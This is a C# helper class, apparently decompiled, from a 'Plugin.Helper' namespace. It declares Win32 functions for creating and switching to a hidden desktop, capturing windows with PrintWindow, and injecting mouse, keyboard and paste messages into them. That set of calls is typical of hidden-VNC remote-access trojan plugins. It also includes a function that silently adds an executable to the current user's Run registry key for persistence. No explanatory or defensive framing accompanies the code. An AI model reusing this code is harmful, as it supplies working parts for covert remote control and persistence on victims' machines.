

using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Text;


namespace Plugin.Helper
{
	public class Utils
	{
		public const uint DESKTOP_ENUMERATE = 1;
		public const int GWL_STYLE = -16;
		public const int WS_DISABLED = 134217728;
		public const int WM_CHAR = 258;
		public const int WM_KEYDOWN = 256;
		public const int WM_KEYUP = 257;
		public const uint WM_PASTE = 770;
		public const int VK_CONTROL = 17;
		public const int V_KEY_V = 86;
		public const int WM_LBUTTONUP = 514;
		public const int WM_LBUTTONDOWN = 513;
		public const int WM_MOUSEMOVE = 512;
		public const int WM_CLOSE = 16;
		public const int WM_SYSCOMMAND = 274;
		public const int SC_MINIMIZE = 61472;
		public const int SC_RESTORE = 61728;
		public const int SC_MAXIMIZE = 61488;
		public const int HTCAPTION = 2;
		public const int HTTOP = 12;
		public const int HTBOTTOM = 15;
		public const int HTLEFT = 10;
		public const int HTRIGHT = 11;
		public const int HTTOPLEFT = 13;
		public const int HTTOPRIGHT = 14;
		public const int HTBOTTOMLEFT = 16;
		public const int HTBOTTOMRIGHT = 17;
		public const int HTCLOSE = 20;
		public const int HTMINBUTTON = 8;
		public const int HTMAXBUTTON = 9;
		public const int HTTRANSPARENT = -1;
		public const int VK_RETURN = 13;
		public const int MN_GETHMENU = 481;
		public const int BM_CLICK = 245;
		public const int MAX_PATH = 260;
		public const int WM_NCHITTEST = 132;
		public const int SW_SHOWMAXIMIZED = 3;

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetDC(IntPtr hWnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetThreadDesktop(IntPtr hDesktop);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr OpenDesktop(
			string lpszDesktop,
			int dwFlags,
			bool fInherit,
			uint dwDesiredAccess);

		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr CreateDesktop(
			string lpszDesktop,
			IntPtr lpszDevice,
			IntPtr pDevmode,
			int dwFlags,
			uint dwDesiredAccess,
			IntPtr lpsa);

		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool GetWindowRect(IntPtr hwnd, out Utils.RECT lpRect);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsWindowVisible(IntPtr hWnd);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetWindow(IntPtr hWnd, Utils.GetWindowType uCmd);

		[DllImport("user32.dll")]
		public static extern IntPtr GetTopWindow(IntPtr hWnd);

		[DllImport("user32.dll")]
		public static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

		[DllImport("gdi32.dll")]
		public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

		[DllImport("gdi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DeleteObject(IntPtr hObject);

		[DllImport("gdi32.dll")]
		public static extern bool DeleteDC(IntPtr hdc);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseDesktop(IntPtr hDesktop);

		[DllImport("gdi32.dll")]
		public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

		[DllImport("user32.dll")]
		public static extern IntPtr WindowFromPoint(Utils.POINT point);

		[DllImport("user32.dll")]
		public static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll")]
		public static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

		[DllImport("user32.dll")]
		public static extern bool ScreenToClient(IntPtr hWnd, ref Utils.POINT lpPoint);

		[DllImport("user32.dll")]
		public static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, Utils.POINT point);

		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		[DllImport("user32.dll")]
		public static extern bool PtInRect(ref Utils.RECT lprc, Utils.POINT pt);

		[DllImport("user32.dll")]
		public static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

		[DllImport("user32.dll")]
		public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

		[DllImport("user32.dll")]
		public static extern bool GetWindowPlacement(IntPtr hWnd, ref Utils.WINDOWPLACEMENT lpwndpl);

		[DllImport("user32.dll")]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		[DllImport("user32.dll")]
		public static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, Utils.POINT pt);

		[DllImport("user32.dll")]
		public static extern int GetMenuItemID(IntPtr hMenu, int nPos);

		[DllImport("user32.dll")]
		public static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

		[DllImport("user32.dll")]
		public static extern bool MoveWindow(
			IntPtr hWnd,
			int x,
			int y,
			int width,
			int height,
			bool repaint);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetWindowPos(
			IntPtr hWnd,
			IntPtr hWndInsertAfter,
			int x,
			int y,
			int cx,
			int cy,
			uint uFlags);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern ushort VkKeyScan(char ch);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool EnumDesktopWindows(
			IntPtr hDesktop,
			Utils.EnumDesktopWindowsDelegate lpfn,
			IntPtr lParam);

		[DllImport("shell32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsUserAnAdmin();

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetWindowTextLength(IntPtr hWnd);

		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

		[DllImport("user32.dll")]
		public static extern bool CloseHandle(IntPtr hObject);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

		public static bool IsAdmin()
		{
			bool flag = false;
			try
			{
				flag = Utils.IsUserAnAdmin();
			}
			catch
			{
			}
			return flag;
		}

		public static bool AddToStartupNonAdmin(string executablePath, string name = "yooooooooo")
		{
			string name1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(name1, true))
					registryKey.SetValue(name, (object) ("\"" + executablePath + "\""));
				return true;
			}
			catch
			{
				return false;
			}
		}

		public delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, IntPtr lParam);

		public enum DESKTOP_ACCESS : uint
		{
			DESKTOP_NONE = 0,
			DESKTOP_READOBJECTS = 1,
			DESKTOP_CREATEWINDOW = 2,
			DESKTOP_CREATEMENU = 4,
			DESKTOP_HOOKCONTROL = 8,
			DESKTOP_JOURNALRECORD = 16, // 0x00000010
			DESKTOP_JOURNALPLAYBACK = 32, // 0x00000020
			DESKTOP_ENUMERATE = 64, // 0x00000040
			DESKTOP_WRITEOBJECTS = 128, // 0x00000080
			DESKTOP_SWITCHDESKTOP = 256, // 0x00000100
			GENERIC_ALL = 511, // 0x000001FF
		}

		public enum GetWindowType : uint
		{
			GW_HWNDFIRST,
			GW_HWNDLAST,
			GW_HWNDNEXT,
			GW_HWNDPREV,
			GW_OWNER,
			GW_CHILD,
			GW_ENABLEDPOPUP,
		}

		public enum SETWINDOWPOSITION : uint
		{
			SWP_NOSIZE = 1,
			SWP_NOMOVE = 2,
			SWP_NOZORDER = 4,
			SWP_NOACTIVATE = 16, // 0x00000010
			SWP_SHOWWINDOW = 64, // 0x00000040
			SWP_HIDEWINDOW = 128, // 0x00000080
			SWP_ASYNCWINDOWPOS = 16384, // 0x00004000
		}

		public struct POINT
		{
			public int x;
			public int y;
		}

		public struct RECT
		{
			public int left;
			public int top;
			public int right;
			public int bottom;
		}

		public struct WINDOWPLACEMENT
		{
			public int length;
			public int flags;
			public int showCmd;
			public Utils.POINT ptMinPosition;
			public Utils.POINT ptMaxPosition;
			public Utils.RECT rcNormalPosition;
		}
	}
}
